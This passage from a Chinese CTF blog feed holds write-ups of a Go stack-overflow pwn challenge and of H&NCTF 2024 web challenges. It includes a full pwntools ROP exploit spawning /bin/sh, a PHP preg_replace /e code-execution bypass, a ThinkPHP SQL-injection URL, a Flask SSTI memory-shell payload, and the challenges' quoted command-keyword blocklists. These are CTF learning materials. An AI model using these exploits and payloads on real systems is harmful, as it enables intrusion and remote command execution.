class=\"number\">30</span> skipped</span><br><span class=\"line\"><span class=\"number\">27</span>:<span class=\"number\">0138</span>│<span class=\"literal\">-0c8</span>   <span class=\"number\">0</span>xc000049e98 —▸ <span class=\"number\">0</span>xc000020090 ◂— <span class=\"string\">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span></span><br><span class=\"line\"><span class=\"number\">28</span>:<span class=\"number\">0140</span>│<span class=\"literal\">-0c0</span>   <span class=\"number\">0</span>xc000049ea0 ◂— <span class=\"number\">0</span>x24 /* <span class=\"string\">&#x27;$&#x27;</span> */</span><br><span class=\"line\"><span class=\"number\">29</span>:<span class=\"number\">0148</span>│<span class=\"literal\">-0b8</span>   <span class=\"number\">0</span>xc000049ea8 —▸ <span class=\"number\">0</span>x49136a ◂— mov <span class=\"built_in\">rbp</span>, qword ptr [<span class=\"type\">rsp</span> + <span class=\"number\">0</span><span class=\"type\">x18</span>]</span><br><span class=\"line\"><span class=\"number\">2</span>a:<span class=\"number\">0150</span>│<span class=\"literal\">-0b0</span>   <span class=\"number\">0</span>xc000049eb0 —▸ <span class=\"number\">0</span>x549e80 (data_start+<span class=\"number\">3296</span>) —▸ <span class=\"number\">0</span>xc000100000 —▸ <span class=\"number\">0</span>x4b9640 ◂— <span class=\"number\">0</span>x8</span><br><span class=\"line\"><span class=\"number\">2</span>b:<span class=\"number\">0158</span>│<span class=\"literal\">-0a8</span>   <span class=\"number\">0</span>xc000049eb8 —▸ <span class=\"number\">0</span>x4aa800 ◂— <span class=\"number\">0</span>x10</span><br><span class=\"line\"><span class=\"number\">2</span>c:<span class=\"number\">0160</span>│<span class=\"literal\">-0a0</span>   <span class=\"number\">0</span>xc000049ec0 —▸ <span class=\"number\">0</span>x4df040 —▸ <span class=\"number\">0</span>x4c15af ◂— <span class=\"number\">0</span>x6f79207475706e49 (<span class=\"string\">&#x27;Input yo&#x27;</span>)</span><br><span class=\"line\"><span class=\"number\">2</span>d:<span class=\"number\">0168</span>│<span class=\"literal\">-098</span>   <span class=\"number\">0</span>xc000049ec8 —▸ <span class=\"number\">0</span>xc000049d98 ◂— <span class=\"number\">0</span>x61616161616161 /* <span class=\"string\">&#x27;aaaaaaa&#x27;</span> */</span><br><span class=\"line\"><span class=\"number\">2</span>e:<span class=\"number\">0170</span>│<span class=\"literal\">-090</span>   <span class=\"number\">0</span>xc000049ed0 ◂— <span class=\"number\">0</span>x100</span><br><span class=\"line\"><span class=\"number\">2</span>f:<span class=\"number\">0178</span>│<span class=\"literal\">-088</span>   <span class=\"number\">0</span>xc000049ed8 ◂— <span class=\"number\">0</span>x100</span><br><span class=\"line\"><span class=\"number\">30</span>:<span class=\"number\">0180</span>│<span class=\"literal\">-080</span>   <span class=\"number\">0</span>xc000049ee0 —▸ <span class=\"number\">0</span>x4df4e8 —▸ <span class=\"number\">0</span>x4aeb40 ◂— <span class=\"number\">0</span>x10</span><br><span class=\"line\"><span class=\"number\">31</span>:<span class=\"number\">0188</span>│<span class=\"literal\">-078</span>   <span class=\"number\">0</span>xc000049ee8 —▸ <span class=\"number\">0</span>xc000010010 —▸ <span class=\"number\">0</span>xc00007e000 ◂— <span class=\"number\">0</span>x0</span><br><span class=\"line\"><span class=\"number\">32</span>:<span class=\"number\">0190</span>│<span class=\"literal\">-070</span>   <span class=\"number\">0</span>xc000049ef0 —▸ <span class=\"number\">0</span>x4c5dd0 —▸ <span class=\"number\">0</span>x49b080 ◂— cmp rsp, qword ptr [<span class=\"type\">r14</span> + <span class=\"number\">0</span><span class=\"type\">x10</span>]</span><br><span class=\"line\"><span class=\"number\">33</span>:<span class=\"number\">0198</span>│<span class=\"literal\">-068</span>   <span class=\"number\">0</span>xc000049ef8 ◂— <span class=\"number\">0</span>x10000</span><br><span class=\"line\"><span class=\"number\">34</span>:<span class=\"number\">01</span>a0│<span class=\"literal\">-060</span>   <span class=\"number\">0</span>xc000049f00 —▸ <span class=\"number\">0</span>xc000102000 ◂— <span class=\"string\">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\n&#x27;</span></span><br><span class=\"line\"><span class=\"number\">35</span>:<span class=\"number\">01</span>a8│<span class=\"literal\">-058</span>   <span class=\"number\">0</span>xc000049f08 ◂— <span class=\"number\">0</span>x24 /* <span class=\"string\">&#x27;$&#x27;</span> */</span><br><span class=\"line\"><span class=\"number\">36</span>:<span class=\"number\">01</span>b0│<span class=\"literal\">-050</span>   <span class=\"number\">0</span>xc000049f10 ◂— <span class=\"number\">0</span>x1000</span><br><span class=\"line\"><span class=\"number\">37</span>:<span class=\"number\">01</span>b8│<span class=\"literal\">-048</span>   <span class=\"number\">0</span>xc000049f18 —▸ <span class=\"number\">0</span>xc000102000 ◂— <span class=\"string\">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\n&#x27;</span></span><br><span class=\"line\"><span class=\"number\">38</span>:<span class=\"number\">01</span>c0│<span class=\"literal\">-040</span>   <span class=\"number\">0</span>xc000049f20 ◂— <span class=\"number\">0</span>x1000</span><br><span class=\"line\"><span class=\"number\">39</span>:<span class=\"number\">01</span>c8│<span class=\"literal\">-038</span>   <span class=\"number\">0</span>xc000049f28 ◂— <span class=\"number\">0</span>x1000</span><br><span class=\"line\"><span class=\"number\">3</span>a:<span class=\"number\">01</span>d0│<span class=\"literal\">-030</span>   <span class=\"number\">0</span>xc000049f30 ◂— <span class=\"number\">0</span>x25 /* <span class=\"string\">&#x27;%&#x27;</span> */</span><br><span class=\"line\"><span class=\"number\">3</span>b:<span class=\"number\">01</span>d8│<span class=\"literal\">-028</span>   <span class=\"number\">0</span>xc000049f38 ◂— <span class=\"number\">0</span>x25 /* <span class=\"string\">&#x27;%&#x27;</span> */</span><br><span class=\"line\"><span class=\"number\">3</span>c:<span class=\"number\">01</span>e0│<span class=\"literal\">-020</span>   <span class=\"number\">0</span>xc000049f40 ◂— <span class=\"number\">0</span>x0</span><br><span class=\"line\">... ↓          <span class=\"number\">2</span> skipped</span><br><span class=\"line\"><span class=\"number\">3</span>f:<span class=\"number\">01</span>f8│<span class=\"literal\">-008</span>   <span class=\"number\">0</span>xc000049f58 ◂— <span class=\"number\">0</span>x1</span><br><span class=\"line\"><span class=\"number\">40</span>:<span class=\"number\">0200</span>│ <span class=\"built_in\">rbp</span>   <span class=\"number\">0</span>xc000049f60 —▸ <span class=\"number\">0</span>xc000049f70 —▸ <span class=\"number\">0</span>xc000049fd0 ◂— <span class=\"number\">0</span>x0</span><br></pre></td></tr></table></figure>\n<p>能清晰地看到，rbp 与缓冲区的大小：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; distance <span class=\"number\">0</span>xf60 <span class=\"number\">0</span>xd98</span><br><span class=\"line\"><span class=\"number\">0</span>xf60-&gt;<span class=\"number\">0</span>xd98 is <span class=\"literal\">-0x1c8</span> bytes (<span class=\"literal\">-0x39</span> words)</span><br></pre></td></tr></table></figure>\n<p>那么，之后就可以直接进行栈溢出了。但是，在经过多次溢出之后，发现了个致命的问题，就是关于这个输入函数，致命在哪里呢？在这儿：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:<span class=\"number\">000000000049</span>A786                 cmp     byte ptr [<span class=\"type\">rax</span>+<span class=\"number\">79</span><span class=\"type\">h</span>], <span class=\"number\">0</span></span><br><span class=\"line\">.text:<span class=\"number\">000000000049</span>A78A                 jnz     short loc_49A79A</span><br></pre></td></tr></table></figure>\n<p>以及：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:<span class=\"number\">000000000049</span>A79A loc_49A79A:                             ; CODE XREF: bufio__ptr_Scanner_Scan+<span class=\"number\">2</span>A↑j</span><br><span class=\"line\">.text:<span class=\"number\">000000000049</span>A79A                 xor     eax, eax</span><br><span class=\"line\">.text:<span class=\"number\">000000000049</span>A79C                 mov     <span class=\"built_in\">rbp</span>, [<span class=\"type\">rsp</span>+<span class=\"number\">0</span><span class=\"type\">D0h</span>+<span class=\"type\">var_8</span>]</span><br><span class=\"line\">.text:<span class=\"number\">000000000049</span>A7A4                 add     rsp, <span class=\"number\">0</span>D0<span class=\"built_in\">h</span></span><br><span class=\"line\">.text:<span class=\"number\">000000000049</span>A7AB                 retn</span><br></pre></td></tr></table></figure>\n<p>它会对这儿进行一次比对，如果是 0，则不会跳转，如果不是 0，则会跳转，直接停止输入的函数。<br>\n所以需要直接用 \\x00 来填充是最保险的。之后就是 syscall 来打，但是 exp 我不是很会写，先借鉴借鉴大佬们的，之后再看看：</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"><span class=\"comment\"># context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\">io = <span class=\"keyword\">process</span>(<span class=\"string\">&#x27;./gostack&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># io = remote(&#x27;8.147.133.63&#x27;,  34196)</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(b<span class=\"string\">&#x27;magic message :&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">bss = <span class=\"number\">0</span>x000000000563C50</span><br><span class=\"line\">syscall_addr = <span class=\"number\">0</span>x0000000000404043</span><br><span class=\"line\">pop_rsi = <span class=\"number\">0</span>x000000000042138a</span><br><span class=\"line\">pop_rax = <span class=\"number\">0</span>x000000000040f984</span><br><span class=\"line\">pop_rdx = <span class=\"number\">0</span>x00000000004944ec</span><br><span class=\"line\">pop_rdi = <span class=\"number\">0</span>x00000000004a18a5</span><br><span class=\"line\">leave_ret = <span class=\"number\">0</span>x000000000049695a</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># write &#x27;/bin/sh\\x00&#x27; to bss</span></span><br><span class=\"line\">rop = p64(pop_rax)</span><br><span class=\"line\">rop += p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">rop += p64(pop_rsi)</span><br><span class=\"line\">rop += p64(bss)</span><br><span class=\"line\">rop += p64(pop_rdx)</span><br><span class=\"line\">rop += p64(<span class=\"number\">8</span>)</span><br><span class=\"line\">rop += p64(pop_rdi)</span><br><span class=\"line\">rop += p64(<span class=\"number\">0</span>) </span><br><span class=\"line\">rop += p64(syscall_addr)</span><br><span class=\"line\">rop += p64(syscall_addr)</span><br><span class=\"line\">rop += p64(syscall_addr)</span><br><span class=\"line\">rop += p64(syscall_addr)</span><br><span class=\"line\">rop += p64(syscall_addr)</span><br><span class=\"line\">rop += p64(syscall_addr)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># execve(&#x27;/bin/sh&#x27;)</span></span><br><span class=\"line\">rop += p64(pop_rax)</span><br><span class=\"line\">rop += p64(<span class=\"number\">0</span>x3b)</span><br><span class=\"line\">rop += p64(pop_rsi)</span><br><span class=\"line\">rop += p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">rop += p64(pop_rdx)</span><br><span class=\"line\">rop += p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">rop += p64(pop_rdi)</span><br><span class=\"line\">rop += p64(bss)</span><br><span class=\"line\">rop += p64(syscall_addr)</span><br><span class=\"line\">rop += p64(syscall_addr)</span><br><span class=\"line\">rop += p64(syscall_addr)</span><br><span class=\"line\">rop += p64(syscall_addr)</span><br><span class=\"line\">rop += p64(syscall_addr)</span><br><span class=\"line\">rop += p64(syscall_addr)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = b<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span> + b<span class=\"string\">&#x27;A&#x27;</span> * <span class=\"number\">0</span>xf8</span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>xc00004dd98)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>x110)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>x110)</span><br><span class=\"line\">payload += b<span class=\"string\">&#x27;D&#x27;</span> * <span class=\"number\">0</span>x60 + b<span class=\"string\">&#x27;E&#x27;</span> * <span class=\"number\">0</span>x50 + b<span class=\"string\">&#x27;F&#x27;</span> *<span class=\"number\">8</span> + rop</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io, gdbscript=&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># b *0x0000000004A0A88</span></span><br><span class=\"line\"><span class=\"comment\"># c</span></span><br><span class=\"line\"><span class=\"comment\"># stack 60</span></span><br><span class=\"line\"><span class=\"comment\">#     &#x27;&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># pause()</span></span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\"><span class=\"built_in\">sleep</span>(<span class=\"number\">0.6</span>)</span><br><span class=\"line\">io.sendline(b<span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">sleep</span>(<span class=\"number\">0.6</span>)</span><br><span class=\"line\">io.sendline(b<span class=\"string\">&#x27;cat flag&#x27;</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"古密\"><a class=\"markdownIt-Anchor\" href=\"#古密\">#</a> 古密</h3>\n<p><img data-src=\"https://img-blog.csdnimg.cn/img_convert/b613dd50168ba85408ec13bb18e31088.png\" alt=\"image.png\"><br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/f08d9bb9ada5a3e235f039b29aca61af.png\" alt=\"image.png\"><br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/39b72b7f9a576909c5c70e045b06bf68.png\" alt=\"image.png\"></p>\n",
            "tags": [
                "Game"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/955175a5.html",
            "url": "http://blog.g01den.top/posts/955175a5.html",
            "title": "【2024】H&NCTF",
            "date_published": "2024-05-17T11:10:34.000Z",
            "content_html": "<h1 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> Web</h1>\n<h2 id=\"please_rce_me\"><a class=\"markdownIt-Anchor\" href=\"#please_rce_me\">#</a> Please_RCE_Me</h2>\n<p><img data-src=\"https://img-blog.csdnimg.cn/img_convert/32f566d418dc4544b9e20d8d13411b66.png\" alt=\"Screenshot 2024-05-12 131227.png\"></p>\n<pre><code>\tGET传参输入?moran=flag，之后获取源码：\n</code></pre>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;moran&#x27;</span>] === <span class=\"string\">&#x27;flag&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;task&#x27;</span>])&amp;&amp;<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;flag&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$str1</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;task&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$str2</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;flag&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\\.|include|require|flag/i&#x27;</span>,<span class=\"variable\">$str1</span>) || <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$str2</span>) != <span class=\"number\">19</span> || <span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/please_give_me_flag/&#x27;</span>,<span class=\"variable\">$str2</span>))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker!&#x27;</span>);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&quot;/please_give_me_flag/ei&quot;</span>,<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;task&#x27;</span>],<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;flag&#x27;</span>]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<pre><code>\t这个是RCE吗？\n\n\t审一审。成功找到了漏洞点，preg_replace(&quot;/please_give_me_flag/ei&quot;,![](https://www.yuque.com/api/services/graph/generate_redirect/latex?_POST%5B'task'%5D%2C#card=math&amp;code=_POST%5B%27task%27%5D%2C&amp;id=o3Kvv)_POST['flag']);可以看到，存在/e模式，再看看PHP版本，5.6.40，可能存在/e的命令执行漏洞。\n\n\t前面，需要绕的Waf第一个为：\n</code></pre>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">preg_match(&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |.|include|require|flag/i&#x27;,$str1)</span><br></pre></td></tr></table></figure>\n<pre><code>\t这个绕过先放放，看看后面两个：\n</code></pre>\n<blockquote>\n<p>strlen(str2) != 19 || preg_match(’/please_give_me_flag/’,str2)</p>\n</blockquote>\n<pre><code>\t因为都是逻辑或，所以得让他们都为False，刚好，please_give_me_flag 长度为19，第二个正则刚好是大小写敏感，所以大小写混合绕过。\n\n\t然后就是补充下关于/e模式的问题：\n</code></pre>\n<blockquote>\n<p>preg_replace 使用了 /e 模式，导致可以代码执行，而且该函数的第一个和第三个参数都是我们可以控制的。我们都知道， preg_replace 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 preg_replace 函数的第二个参数）当做代码来执行</p>\n</blockquote>\n<pre><code>\t最后尝试下phpinfo：\n</code></pre>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//POST传参</span><br><span class=\"line\">flag=Please_give_me_flag&amp;task=phpinfo()</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://img-blog.csdnimg.cn/img_convert/5360c207b3d310e77b32d9bc41be09d4.png\" alt=\"Screenshot 2024-05-12 132313.png\"></p>\n<pre><code>\t成功打出组合拳。\n\n\t再回头看看第一个过滤，看上去几乎把所有的shell函数都过滤了。推测flag在根目录，那么学着使用无参数RCE的方式打这套组合拳，payload如下：\n</code></pre>\n<blockquote>\n<p>flag=Please_give_me_flag&amp;task=chdir(&quot;/&quot;)|highlight_file(scandir(pos(localeconv()))[7])</p>\n</blockquote>\n<p>最后得到 flag</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/img_convert/c6799817df231c2c29d719c55eb21a19.png\" alt=\"Screenshot 2024-05-12 132839.png\"></p>\n<h2 id=\"ez_tp复现\"><a class=\"markdownIt-Anchor\" href=\"#ez_tp复现\">#</a> ez_tp（复现）</h2>\n<p>看起来像是 thinkphp 的题，不过，是非预期的题，用平常的 payload 一把梭怕是不对，所以，还能怎么搞？下在附件下来审审吧。<br>\n在附件 /ez_tp/App/Home/Controller 中存在 IndexController.class.php 文件，打开看看：<br>\n这应该是一个路由吧：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public function h_n()</span><br></pre></td></tr></table></figure>\n<p>路由应该是 h_n，那么，应该怎么打呢？不知道为啥，复现的时候日志找不到了，看 dalao 们的 wp 的时候，都说的是根据后台的日志有 payload，但是现在跑去找又找不到了。<br>\n继续往后面审计，发现了如下代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$name = I(<span class=\"string\">&#x27;GET.name&#x27;</span>);</span><br></pre></td></tr></table></figure>\n<p>好，知道了需要通过 get 传参，还是 GET 传参。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$pattern = <span class=\"string\">&quot;insert|update|delete|and|or|\\/\\*|\\*|\\.\\.\\/|\\.\\/|into|load_file|outfile|dumpfile|sub|hex&quot;</span>;</span><br><span class=\"line\">            $pattern.= <span class=\"string\">&quot;|file_put_contents|fwrite|curl|system|eval|assert&quot;</span>;</span><br><span class=\"line\">            $pattern.= <span class=\"string\">&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>;</span><br><span class=\"line\">            $pattern.= <span class=\"string\">&quot;|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec&quot;</span>;</span><br><span class=\"line\">            $vpattern = explode(<span class=\"string\">&quot;|&quot;</span>, $pattern);</span><br><span class=\"line\">            $<span class=\"built_in\">bool</span> = false;</span><br><span class=\"line\">            foreach ($<span class=\"built_in\">input</span> <span class=\"keyword\">as</span> $k =&gt; $v) &#123;</span><br><span class=\"line\">                foreach ($vpattern <span class=\"keyword\">as</span> $value) &#123;</span><br><span class=\"line\">                    foreach ($v <span class=\"keyword\">as</span> $kk =&gt; $vv) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">&quot;/$value/i&quot;</span>, $vv)) &#123;</span><br><span class=\"line\">                            $<span class=\"built_in\">bool</span> = true;</span><br><span class=\"line\">                            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> ($<span class=\"built_in\">bool</span>) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ($<span class=\"built_in\">bool</span>) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> $<span class=\"built_in\">bool</span>;</span><br></pre></td></tr></table></figure>\n<p>这里大概审一下就是，检测所有的键值对中，是否存在黑名单字段，所以，我们传入的参数键值对都不能出现黑名单字段，因此，文件包含和 RCE 没法打，再看看下面的这段代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (waf())&#123;</span><br><span class=\"line\">            $this-&gt;index();</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            $ret = $User-&gt;field(<span class=\"string\">&#x27;username,age&#x27;</span>)-&gt;where(array(<span class=\"string\">&#x27;username&#x27;</span>=&gt;$name))-&gt;select();</span><br><span class=\"line\">            echo var_export($ret, true);</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n<p>猜测应该这儿应该有个 sql 注入存在，并且没有过滤 select，所以，根据 thinkphp 的以前的 payload，以及大佬的 wp 中说的日志中的信息，可以得知 payload 为：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/index.php/home/index/h_n？name[<span class=\"number\">0</span>]=exp&amp;name[<span class=\"number\">1</span>]=%3d%27test123%<span class=\"number\">27</span>%20union%20select%<span class=\"number\">201</span>,flag%<span class=\"number\">20</span><span class=\"keyword\">from</span>%20flag</span><br></pre></td></tr></table></figure>\n<p>最后得到了 flag： array (0 =&gt; array ( ‘username’ =&gt; ‘1’, ‘age’ =&gt; ‘H&amp;NCTF {Cjp_6c3114ee-23e1-459b-ad88-9b29ccfde934}’, ), )</p>\n<h2 id=\"ezflask复现\"><a class=\"markdownIt-Anchor\" href=\"#ezflask复现\">#</a> ezFlask（复现）</h2>\n<p>题目没出 flask，但是好在了解了一个新的 flask 的 ssti 的姿势，记录在这儿，不知道为啥，跟着 wp 复现，却还是失败了，先记录吧，之后再改。<br>\n首先，打开网页就给了个提示：</p>\n<div class=\"note info\">\n<p>冒险即将开始！！！ 请移步 / Adventure 路由进行命令执行，后端语句为： cmd = request.form [‘cmd’] eval (cmd) 注意，你仅有一次机会，在进行唯一一次成功的命令执行后生成 flag 并写入 /flag 执行无回显，目录没权限部分命令 ban，也不要想着写文件～</p>\n</div>\n<h3 id=\"失败情况\"><a class=\"markdownIt-Anchor\" href=\"#失败情况\">#</a> 失败情况：</h3>\n<p>大概跟他提示的一样，就是一个命令执行，不过没思路，很可惜，看了下 wp，说的是写入内存马到一个路由里，但是我复现却失败了，不知是为何，他给的内存马的 payload 能成功写入，并且能访问到写入的路由，但是，却会报 500 错误，不知是为何，等官方 wp 出了再看看是为啥吧，payload 先写在下面。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmd=render_template_string(<span class=\"string\">&quot;&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\\&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;myshell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;)).read())\\&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>\n<h3 